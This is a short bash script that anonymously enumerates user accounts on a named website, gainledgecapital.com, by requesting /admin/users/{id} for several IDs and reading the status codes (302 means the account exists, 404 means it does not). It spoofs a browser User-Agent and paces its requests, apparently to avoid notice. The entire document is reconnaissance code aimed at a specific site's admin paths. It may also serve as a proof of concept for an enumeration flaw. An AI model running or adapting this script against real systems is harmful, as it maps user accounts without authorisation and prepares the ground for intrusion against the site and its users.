#!/bin/bash
# Anonymously enumerate user IDs by polling /admin/users/{id}
# 302 = exists, 404 = does not exist.
for id in 1 100 137 200 5000; do
  code=$(curl -sS -o /dev/null -w "%{http_code}" \
    -H "User-Agent: Mozilla/5.0" \
    "https://gainledgecapital.com/admin/users/$id")
  echo "$code  /admin/users/$id"
  sleep 0.4
done
